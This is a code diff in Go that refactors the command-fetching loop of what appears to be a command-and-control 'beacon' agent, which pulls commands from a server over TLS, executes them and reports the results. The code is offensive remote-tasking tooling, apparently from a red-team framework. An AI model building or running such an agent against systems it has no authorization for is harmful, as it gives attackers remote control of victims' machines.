@@ -195,33 +195,41 @@ func updateConfigField(current *string, new, fieldName string) {
 
 func handleCommandRequest(beacon *tls.Conn, encoder *gob.Encoder, decoder *gob.Decoder, agentID string) error {
 	logger.Logf(logger.Info, "Fetching commands to run")
+
 	for {
 		if err := sendRequest(encoder, types.CommandRequestType, types.CommandRequest{AgentID: agentID}); err != nil {
 			return err
 		}
-
 		var response types.Response
 		if err := decoder.Decode(&response); err != nil {
 			return fmt.Errorf("error decoding command response: %v", err)
 		}
-
 		if response.Type == types.CommandResponseType {
 			if commandResponse, ok := response.Payload.(types.CommandResponse); ok {
 				commandResult := executeAndReportCommand(beacon, encoder, commandResponse)
 				if commandResult.CommandResult == "2" {
-					break
+					goto Exit
 				}
 			} else {
-				return fmt.Errorf("unexpected payload type")
-			}
-		} else if response.Type == types.CommandStatusResponseType {
-			if commandStatusResponse, ok := response.Payload.(types.CommandStatusResponse); ok {
-				logger.Logf(logger.Info, "Server received command success message: %v", commandStatusResponse)
+				return fmt.Errorf("unexpected payload type for CommandResponse")
 			}
 		} else {
-			return fmt.Errorf("unexpected response type: %v", response.Type)
+			return fmt.Errorf("unexpected response type: %v, expected CommandResponseType", response.Type)
+		}
+		if err := decoder.Decode(&response); err != nil {
+			return fmt.Errorf("error decoding command status response: %v", err)
+		}
+		if response.Type == types.CommandStatusResponseType {
+			if commandStatusResponse, ok := response.Payload.(types.CommandStatusResponse); ok {
+				logger.Logf(logger.Info, "Server received command success message: %v", commandStatusResponse)
+			} else {
+				return fmt.Errorf("unexpected payload type for CommandStatusResponse")
+			}
+		} else {
+			return fmt.Errorf("unexpected response type: %v, expected CommandStatusResponseType", response.Type)
 		}
 	}
+Exit:
 	return nil
 }
 
